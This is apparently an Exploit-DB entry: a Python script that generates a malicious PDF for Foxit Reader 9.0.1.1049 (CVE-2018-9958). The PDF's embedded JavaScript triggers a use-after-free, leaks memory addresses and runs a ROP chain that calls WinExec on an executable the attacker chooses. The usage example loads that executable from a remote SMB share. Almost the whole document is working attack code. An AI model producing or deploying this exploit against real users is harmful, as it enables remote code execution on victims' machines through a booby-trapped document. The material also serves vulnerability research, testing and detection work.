# Exploit Title: Foxit Reader 9.0.1.1049 - Arbitrary Code Execution
# Date: 2020-08-29
# Exploit Author: CrossWire
# Vendor Homepage: https://www.foxitsoftware.com/
# Software Link: https://www.foxitsoftware.com/downloads/latest.php?product=Foxit-Reader&platform=Windows&version=9.0.1.1049&package_type=exe&language=English
# Version: 9.0.1.1049
# Tested on: Microsoft Windows Server 2016 10.0.14393
# CVE : [2018-9958](https://nvd.nist.gov/vuln/detail/CVE-2018-9958)

#!/usr/bin/python3

'''
===========================================================================
|   PDF generator for Foxit Reader Remote Code Execution (CVE 2018-9958)  |
===========================================================================
| Written by: Kevin Dorland (CrossWire)                                   |
| Date: 08/29/2020                                                        |
|                                                                         |
| Exploit originally discovered by Steven Seeley (mr_me) of Source Incite |
|                                                                         |
| References:                                                             |
|   https://www.exploit-db.com/exploits/44941 (Steven Seely Calc.exe PoC) |
|   https://www.exploit-db.com/exploits/45269 (Metasploit adaptation)     |
|                                                                         |
===========================================================================
'''


PDF_TEMPLATE = '''
%PDF
1 0 obj
<</Pages 1 0 R /OpenAction 2 0 R>>
2 0 obj
<</S /JavaScript /JS (

var heap_ptr   = 0;
var foxit_base = 0;
var pwn_array  = [];

function prepare_heap(size){
    var arr = new Array(size);
    for(var i = 0; i < size; i++){
        arr[i] = this.addAnnot({type: "Text"});;
        if (typeof arr[i] == "object"){
            arr[i].destroy();
        }
    }
}

function gc() {
    const maxMallocBytes = 128 * 0x100000;
    for (var i = 0; i < 3; i++) {
        var x = new ArrayBuffer(maxMallocBytes);
    }
}

function alloc_at_leak(){
    for (var i = 0; i < 0x64; i++){
        pwn_array[i] = new Int32Array(new ArrayBuffer(0x40));
    }
}

function control_memory(){
    for (var i = 0; i < 0x64; i++){
        for (var j = 0; j < pwn_array[i].length; j++){
            pwn_array[i][j] = foxit_base + 0x01a7ee23; // push ecx; pop esp; pop ebp; ret 4
        }
    }
}

function leak_vtable(){
    var a = this.addAnnot({type: "Text"});

    a.destroy();
    gc();

    prepare_heap(0x400);
    var test = new ArrayBuffer(0x60);
    var stolen = new Int32Array(test);

    var leaked = stolen[0] & 0xffff0000;
    foxit_base = leaked - 0x01f50000;
}

function leak_heap_chunk(){
    var a = this.addAnnot({type: "Text"});
    a.destroy();
    prepare_heap(0x400);

    var test = new ArrayBuffer(0x60);
    var stolen = new Int32Array(test);

    alloc_at_leak();
    heap_ptr = stolen[1];
}

function reclaim(){
    var arr = new Array(0x10);
    for (var i = 0; i < arr.length; i++) {
        arr[i] = new ArrayBuffer(0x60);
        var rop = new Int32Array(arr[i]);

        rop[0x00] = heap_ptr;                // pointer to our stack pivot from the TypedArray leak
        rop[0x01] = foxit_base + 0x01a11d09; // xor ebx,ebx; or [eax],eax; ret
        rop[0x02] = 0x72727272;              // junk
        rop[0x03] = foxit_base + 0x00001450  // pop ebp; ret
        rop[0x04] = 0xffffffff;              // ret of WinExec
        rop[0x05] = foxit_base + 0x0069a802; // pop eax; ret
        rop[0x06] = foxit_base + 0x01f2257c; // IAT WinExec
        rop[0x07] = foxit_base + 0x0000c6c0; // mov eax,[eax]; ret
        rop[0x08] = foxit_base + 0x00049d4e; // xchg esi,eax; ret
        rop[0x09] = foxit_base + 0x00025cd6; // pop edi; ret
        rop[0x0a] = foxit_base + 0x0041c6ca; // ret
        rop[0x0b] = foxit_base + 0x000254fc; // pushad; ret

        //Path to executable

<PATH TO EXECUTABLE>

        //End Path to executable

        rop[0x17] = 0x00000000;              // adios, amigo
    }
}

function trigger_uaf(){
    var that = this;
    var a = this.addAnnot({type:"Text", page: 0, name:"uaf"});
    var arr = [1];
    Object.defineProperties(arr,{
        "0":{
            get: function () {

                that.getAnnot(0, "uaf").destroy();

                reclaim();
                return 1;
            }
        }
    });

    a.point = arr;
}

function main(){
    leak_heap_chunk();
    leak_vtable();
    control_memory();
    trigger_uaf();
}

if (app.platform == "WIN"){
    if (app.isFoxit == "Foxit Reader"){
        if (app.appFoxitVersion == "9.0.1.1049"){
            main();
        }
    }
}

)>> trailer <</Root 1 0 R>>
'''

import sys

#Enforces 2 hex char byte notation. "0" becomes "0x00"
def format_byte(b):

    if (len(b) > 2) and (b[0:2] == '0x'):
        b = b[2:]

    if len(b) == 1:
        b = '0' + b

    return '0x' + b

def char2hex(c):
    return format_byte(hex(ord(c)))

#Converts file path into array of eleven 32-bit hex words
def path_to_machine_code(path,little_endian = True):

    print("[+] Encoding Path:",path)

    #ensure length
    if len(path) > 44:
        print("[CRITICAL] Path length greater than 44 characters (bytes). Aborting!")
        exit(-1)

    #Copy path into 4 character (32 bit) words (max 11)
    word_array = []
    for i in range(11):

        word = ''

        if len(path):
            word += path[0:4] if len(path) >= 4 else path
            path = path[len(word):]

        if len(word) < 4:
            word += chr(0) * (4 - len(word))

        word_array.append(word)

    #Convert chars to hex values and format to "0xAABBCCDD" notation
    hex_array = []
    for word in word_array:

        #Reverse byte order to fit little endian standard
        if(little_endian): word = word[::-1]

        #Write bytes to hex strings
        hex_string = '0x'
        for char in word:
            hex_string += char2hex(char)[2:] #strip the 0x off the byte here

        hex_array.append(hex_string)

    return hex_array

#writes encoded path to rop array to match template
def create_rop(hex_arr, start_index = '0c'):

    ord_array = []

    index = int(start_index,16)

    for instruction in hex_arr:

        full_instruction = f"\trop[{format_byte(hex(index))}] = {instruction};"

        ord_array.append(full_instruction)

        index += 1

    return ('\n'.join(ord_array))



if __name__ == '__main__':

    if len(sys.argv) != 3:
        print(f"USAGE: {sys.argv[0]} <path to executable> <pdf filename>")
        print("-- EXAMPLES --")
        print(f"{sys.argv[0]} \\\\192.168.0.1\\exploits\\bad.exe evil.pdf")

        exit(-1)

    #Parse user args
    EXE_PATH = sys.argv[1]
    PDF_PATH = sys.argv[2]

    #Generate hex
    raw_hex = path_to_machine_code(EXE_PATH)

    print("[+] Machine Code:")
    for hex_word in raw_hex:
        print(hex_word)

    ord_string = create_rop(raw_hex)

    print("[+] Instructions to add:")
    print(ord_string)

    print("[+] Generating pdf...")

    print("\t- Filling template...")
    evil_pdf = PDF_TEMPLATE.replace('<PATH TO EXECUTABLE>',ord_string)

    print("\t- Writing file...")
    with open(PDF_PATH,'w') as fd:
        fd.write(evil_pdf)

    print("[+] Generated pdf:",PDF_PATH)